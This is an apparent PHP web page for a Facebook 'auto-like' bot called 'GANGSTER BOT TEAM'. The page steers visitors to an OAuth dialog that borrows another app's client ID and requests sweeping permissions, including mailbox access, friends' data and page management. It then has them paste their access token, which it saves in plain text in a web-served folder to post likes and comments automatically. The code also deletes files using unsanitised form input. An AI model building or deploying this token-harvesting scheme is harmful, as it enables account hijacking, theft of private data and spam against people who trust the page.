<link rel="icon" type="image/png" href="http://www.flagsofallcountries.com/Asia/Pakistan/pakistan_mwc.gif">

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
	<head>
			<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
			<meta http-equiv="X-UA-Compatible" content="IE=edge">
			<meta name="viewport" content="width=device-width, initial-scale=0.4">
			<title>SUFYAN JAN</title>
			<style>@font-face {font-family: yasirfonts;src: url(fonts/king.ttf);}</style>
			<style>@font-face {font-family: mughalfonts;src: url(fonts/king.ttf);}</style>
				<style>
					html { 
				  background: url(http://www.learnpakistan.com/wp-content/uploads/2011/08/Flag-of-pakistan-wallpaper-4.jpg) no-repeat center center fixed; 
				  background-color: #000; 
				  -webkit-background-size: cover;
				  -moz-background-size: cover;
				  -o-background-size: cover;
				  background-size: cover;
				}
				a

				{

				  text-decoration: none;

				  color:white;

				}

				#footer

				{



					vertical-align: center;


				}

				.form

				{

					position: absolute;

					vertical-align: center;

					width: 98%;

					top: 40%;

				}

				.form1

				{

					position: absolute;

					vertical-align: center;

					width: 98%;

					top: 55%;

				}

				.access

				{

					position: absolute;

					vertical-align: center;

					width: 98%;

				}

				.access h2

				{

					margin-top: -15px;

				}

				input[type=text] {

				font-family:king.ttf;

					width: 60%;

					height: 5%;

					padding: 8px 32px;

					margin: 8px 0;

					font-size:22px;

					box-sizing: border-box;

					border: 2px solid white;

					background-color: black;

					color: white;

					border-radius:50px;

					outline: none;

					text-align: center;

				}

				input[type=password] {

				font-family:YASIRfonts;

					width: 60%;

					height: 5%;

					padding: 8px 32px;

					margin: 8px 0;

					font-size:22px;

					box-sizing: border-box;

					border: 2px solid white;

					background-color: black;

					color: white;

					border-radius:50px;

					outline: none;

					text-align: center;

				}

				.button {

					font-family:YASIRfonts;

					height: 5%;

					background-color: black; /* Green */

					border: 2px solid white;

					color: white;

					padding: 8px 32px;

					text-align: center;

					text-decoration: none;

					display: inline-block;

					font-size: 15px;

					margin: 4px 2px;

					-webkit-transition-duration: 0.4s; /* Safari */

					transition-duration: 0.4s;

					cursor: pointer;

				}



				.button1 {

					background-color: black;

					color: white;

					border-radius:50px;

					
				}



				.button1:hover {

					background-color: white;

					color: black;

				}

				.button2 {

					background-color: RED;

					color: white;

					border-radius:50px;
					
					padding: 3px 8px;

				}



				.button2:hover {

					background-color: black;

					color: white;

				}

				.button3 {

					background-color: Green;

					color: white;

					border-radius:50px;
					
					padding: 7px 15px;

				}



				.button3:hover {

					background-color: blue;

					color: white;

				}

				</style>
	</head>

	<body>

<?php
error_reporting(0);
$bot=new bot();
class bot{ 

public function getGr($as,$bs){
$ar=array(
        'graph',
        'fb',
        'me'
);
$im='https://'.implode('.',$ar);

return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
$ar=array(
        'access_token' => $tk,
);
if($uh){
$else=array_merge($ar,$uh);
        }else{
        $else=$ar;
}
foreach($else as $b => $c){
        $xxx[]=$b.'='.$c;
}
$true='?'.implode('&',$xxx);
$true=$this->getGr($mb,$true);
$true=json_decode($this->
one($true),true);
if($true[data]){
        return $true[data];
}else{
        return $true;}
}

private function one($url){
$cx=curl_init();
curl_setopt_array($cx,array(
CURLOPT_URL => $url,
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_USERAGENT => 'DESCRIPTION by SUFYAN JAN',
));
$ch=curl_exec($cx);
        curl_close($cx);
        return ($ch);
}

public function savEd($tk,$id,$a,$b,$o,$c,$z=null,$bb=null){
if(!is_dir('xxx')){
        mkdir('xxx');
}
if($bb){
$blue=fopen('xxx/'.$id,'w');
fwrite($blue,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$bb);
        fclose($blue);

echo'<script type="text/javascript">alert("INFO : Text robot telah dibuat")</script>';
}else{
        if($z){
if(file_exists('xxx/'.$id)){
$file=file_get_contents('xxx/'.$id);
$ex=explode('*',$file);
$str=str_replace($ex[0],$tk,$file);
$xs=fopen('xxx/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}else{
$str=$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c;
$xs=fopen('xxx/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}
$_SESSION[key]=$tk.'_'.$id;
}else{
$file=file_get_contents('xxx/'.$id);
$file=explode('*',$file);
        if($file[5]){
$up=fopen('xxx/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$file[5]);
        fclose($up);
        }else{
$up=fopen('xxx/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c);
        fclose($up);
        }
echo'<script type="text/javascript">alert("INFO : Data Anda telah ter Save, Robot berjalan otomatis")</script>';}}
}

public function lOgbot($d){
        unlink('xxx/'.$d);
        unset($_SESSION[key]);

echo'
<script type="text/javascript">alert("INFO : Logout success")
</script>';

        $this->atas();
        $this->home();
        $this->bwh();
}

public function cek($tok,$id,$nm){
$if=file_get_contents('xxx/'.$id);
$if=explode('*',$if);
if(preg_match('/on/',$if[1])){
        $satu='on';
        $ak='Like tambah komen';
}else{
        $satu='off';
        $ak='Like saja';
}
if(preg_match('/on/',$if[2])){
        $dua='on';
        $ik='Bot emo';
}else{
        $dua='off';
        $ik='Bot manual';
}
if(preg_match('/on/',$if[3])){
        $tiga='on';
        $ek='Powered on';
}else{
        $tiga='off';
        $ek='Powered off';
}
if(preg_match('/on/',$if[4])){
        $empat='on';
        $uk='Text via script';
}else{
        $empat='off';
        $uk='Via text sendiri';
}
echo'
<div id="bottom-content">
<div id="navigation-menu">
<h3><a name="navigation-name" class="no-link">BOT By '.$nm.'</a></h3>
<ul>
<li>
Welcome Back : <font color="red">'.$nm.'</font></li>
<li>
<a href="http://m.facebook.com/'.$id.'"><img src="https://graph.facebook.com/'.$id.'/picture" style="width:50px; height:50px;" alt="'.$nm.'"/></a></li>
<li>
<form action="index.php" method="post"><input type="hidden" name="logout" value="'.$id.'">
<input type="submit" value="Logout Bot"></form></li>
<li>
<form action="index.php" method="post">
Select Menu Robot</li>
<li>
<select name="likes">';
        if($satu=='on'){
        echo'
<option value="'.$satu.'">
'.$ak.'
</option>
<option value="off">
Like saja</option>
</select>';
        }else{
        echo'
<option value="'.$satu.'">
'.$ak.'
</option>
<option value="on">
Like tambah komen</option>
</select>';
}
echo'</li>
<li>
<select name="emot">';
        if($dua=='on'){
        echo'
<option value="'.$dua.'">
'.$ik.'
</option>
<option value="off">
Bot manual</option>
</select>';
        }else{
        echo'
<option value="'.$dua.'">
'.$ik.'
</option>
<option value="on">
Bot emo</option>
</select>';
}
echo'</li>
<li>
<select name="target">';
        if($tiga=='on'){
        echo'
<option value="'.$tiga.'">
'.$ek.'
</option>
<option value="off">
Powered off</option>
</select>';
        }else{
        echo'
<option value="'.$tiga.'">
'.$ek.'
</option>
<option value="on">
Powered on</option>
</select>';
}
echo'</li>
<li>';
        if($empat=='on'){
        echo'
<select name="opsi">
<option value="'.$empat.'">
'.$uk.'
</option>
<option value="off">
Via text sendiri</option>
</select>';
}else{
        if($if[5]){
        echo'
<select name="opsi">
<option value="'.$empat.'">
'.$uk.'
</option>
<option value="text">
Ganti Text Anda
</option>
<option value="on">
Text via script</option>
</select>';
        }else{
        echo'
Buat text Anda
<br>
<input type="text" name="text" style="height:30px;">
<input type="hidden" name="opsi" value="'.$empat.'">';}
}
echo'
</li>
</ul></div>

<div id="top-content">
<div id="search-form">
<input type="submit" value="SAVE"></form>
</div></div></div>';

$this->membEr();
}

public function atas(){
$hari=array(1=>
        "Monday",
        "Tuesday",
        "Wednesday",
        "Thursday",
        "Friday",
        "Saturday",
        "Sunday"
);

$bulan=array(1=>
"January",
  "February",
    "March",
     "April",
       "May",
         "June",
           "July",
             "August",
               "September",
          "October",
     "November",
"Desember"
);

$hr=$hari[gmdate('N',time()+60*60*7)];
$tgl=gmdate('j',time()+60*60*7);
$bln=
$bulan[gmdate('n',time()+60*60
*7)];
$thn=gmdate('Y',time()+60*60*7);
$jam=gmdate('H',time()+60*60*7);

echo'
			<div id="header">
					</div>

					<div id="content">
					<div class="post">
					<div class="post-meta">
						<h2 class="title">
						<h2 align="center">
							<font style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.9em rgb(0, 163, 239), 0pt 2pt 0.9em rgb(0, 163, 239);color: #00FFFF ;font-family:YASIRfonts;font-size:80px;">
								GANGSTER BOT TEAM
							</font>
						</h2>
						<center>
							<font style= "text-shadow: 0px 0px 6px rgb(0, 163, 239), 0px 0px 5px rgb(0, 0, 0), 0px 0px 5px rgb(0, 0, 0); color: red; font-weight: bold;" size="3">
								_______________
							</font>
						</center>
						<br>
';
} 

public function home(){
echo'
	<div class="post-content">
						<span>
							<a href="https://www.facebook.com/abusufyanj" target="_blank">
								 <img src="https://graph.facebook.com/100007281001467/picture?type=large" style="border: 4px solid green; padding: 4px; margin: 4px; width: 200px; height: 200px; float: left;" alt="SUFYAN JAN" class="thumbnail"/>
							</a>
<iframe src="//www.facebook.com/plugins/subscribe.php?href=https://www.facebook.com/100007281001467
&layout=button_count&amp;show_faces=false&colorscheme=light&font=lucida+grande&amp;width=105&appId=281570931938574" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:110px; height:50px;" allowTransparency="true"></iframe>
						<a href="https://www.facebook.com/GulraizOfficial" target="_blank">
							 <img src="https://graph.facebook.com/100007399512115/picture?type=large" style="border: 4px solid green; padding: 4px; margin: 4px; width: 200px; height: 200px; float: right;" alt="SUFYAN JAN & GULRAIZ REHMAN" class="thumbnail">
						</a>
<iframe src="//www.facebook.com/plugins/subscribe.php?href=https://www.facebook.com/100007399512115
&layout=button_count&amp;show_faces=false&colorscheme=light&font=lucida+grande&amp;width=105&appId=281570931938574" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:110px; height:50px;" allowTransparency="true"></iframe>

						<br>
					</div>
						<center>
							<font face="mughalfonts" size="4" style= "text-shadow: 0pt 0pt 0.9em green, 0pt 2pt 0.9em green; color: lime; font-weight: bold;">
								Follow Me On :
							</font>
								<b>
									<u>
										<a href="https://www.facebook.com/abusufyanj" target="_blank">
											<font size="5.6" style= "text-shadow: 0pt 0pt 0.9em #0E359E, 0pt 2pt 0.9em #0E359E; color: #0DB90B ; font-weight: bold;">
												FACEBOOK 
											</font>
										</a>
									</u>
								<br>
							<font face="mughalfonts" size="3" style= "text-shadow: 0px 0px 10px rgb(255, 0, 0), 0px 0px 10px rgb(255, 0, 0), 0px 0px 10px rgb(255, 0, 0); color: rgb(255, 255, 255); font-weight: bold;">
								Script Bot &copy; 2018
							</font>
							<br>
								<font face="mughalfonts" size="3" style= "text-shadow: 0pt 0pt 0.9em #0E359E, 0pt 2pt 0.9em #0E359E; color: rgb(255, 255, 255); font-weight: bold;">
									Script Created By  SUFYAN JAN
								</font>
							<br><br>
						</center>

							<center>
								<font style= "text-shadow: 0px 0px 6px rgb(0, 163, 239), 0px 0px 5px rgb(0, 0, 0), 0px 0px 5px rgb(0, 0, 0); color: red; font-weight: bold;" size="3">
									_______________
								</font>
							</center>
						</span>
					</div>
					<br>
					<div class="post-meta2">



					</div></div></div>
';
}

public function bwh(){
echo'
<div id="bottom-content">
					<div id="navigation-menu">
							<center><br>
								<font face="king.tff" style= "text-shadow: 0pt 0pt 0.9em green, 0pt 2pt 0.9em green; color: black; font-weight: bold;" size="4">
									<a target="_blank" href="https://www.facebook.com/v1.0/dialog/oauth?redirect_uri=fbconnect%3A%2F%2Fsuccess&sso_key=com&scope=email%2Cpublish_actions%2Cuser_about_me%2Cuser_actions.books%2Cuser_actions.music%2Cuser_actions.news%2Cuser_actions.video%2Cuser_activities%2Cuser_birthday%2Cuser_education_history%2Cuser_events%2Cuser_games_activity%2Cuser_groups%2Cuser_hometown%2Cuser_interests%2Cuser_likes%2Cuser_location%2Cuser_notes%2Cuser_photos%2Cuser_questions%2Cuser_relationship_details%2Cuser_relationships%2Cuser_religion_politics%2Cuser_status%2Cuser_subscriptions%2Cuser_videos%2Cuser_website%2Cuser_work_history%2Cfriends_about_me%2Cfriends_actions.books%2Cfriends_actions.music%2Cfriends_actions.news%2Cfriends_actions.video%2Cfriends_activities%2Cfriends_birthday%2Cfriends_education_history%2Cfriends_events%2Cfriends_games_activity%2Cfriends_groups%2Cfriends_hometown%2Cfriends_interests%2Cfriends_likes%2Cfriends_location%2Cfriends_notes%2Cfriends_photos%2Cfriends_questions%2Cfriends_relationship_details%2Cfriends_relationships%2Cfriends_religion_politics%2Cfriends_status%2Cfriends_subscriptions%2Cfriends_videos%2Cfriends_website%2Cfriends_work_history%2Cads_management%2Ccreate_event%2Ccreate_note%2Cexport_stream%2Cfriends_online_presence%2Cmanage_friendlists%2Cmanage_notifications%2Cmanage_pages%2Cphoto_upload%2Cpublish_stream%2Cread_friendlists%2Cread_insights%2Cread_mailbox%2Cread_page_mailboxes%2Cread_requests%2Cread_stream%2Crsvp_event%2Cshare_item%2Csms%2Cstatus_update%2Cuser_online_presence%2Cvideo_upload%2Cxmpp_login&response_type=token&client_id=41158896424&__mref=message_bubble&_rdr" target="_blank">
										<h3>
											Click Here To Allow Application
										</h3>
									</a>
									<a target="_blank" href="https://developers.facebook.com/tools/debug/accesstoken/?app_id=41158896424" target="_blank">
										<h3>
											Click Here To Get Access Token
										</h3>
									</a>
								</font>
							</center>
					</div>
					<div id="top-content">
					<div id="search-form">
						<center>
							<form class="index.php" action="index.php" method="post">
								<input type="text" name="token" placeholder="Paste Your Access Token Here" required>
								<br>
								<input class="button button1" type="submit" value="Activate Bot">
							</form>
						</center>
					</div></div></div>
';

$this->membEr();
}

public function membEr(){
        if(!is_dir('xxx')){
        mkdir('xxx');
}
$up=opendir('xxx');
while($use=readdir($up)){
if($use != '.' && $use != '..'){
        $user[]=$use;}
        }

echo'
<div id="footer">
						<center>
							<font face="yasirfonts" size="5" color="blue" style= "text-shadow: 0px 0px 4px rgb(255, 0, 0), 0px 0px 4px rgb(255, 0, 0), 0px 0px 10px rgb(255, 0, 0); color: rgb(0, 163, 239); font-weight: bold;" size="4">
								Active Users 
							 </font>
							
								: 
							<font style= "text-shadow: 0px 0px 2px rgb(255, 0, 0), 0px 0px 2px rgb(255, 0, 0), 0px 0px 10px rgb(255, 0, 0); color: rgb(0, 163, 239); font-weight: bold;" size="3">
								'.count($user).'
							
 </font>
							<br><br>
							<font face="mughalfonts">
							<font color="#00FF00">➡</font><font color="#00FFF0">GANG</font><font color="red">STER
							<font color="red" size="6"></font>BO</font><font color="#00FF00">T<font color="red" size="6"></font><font color="#00FF00">TE</font>_
							
							<font color="red">A</font><font color="#00FFF0">M</font><font color="#00FF00">⬅</font>
							</font>
						</center>
					</div>
	</body>
</html>
</div>';
}

public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('xxx/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Session Token Expired")</script>';
        unset($_SESSION[key]);
        unlink('xxx/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Token invalid")</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>
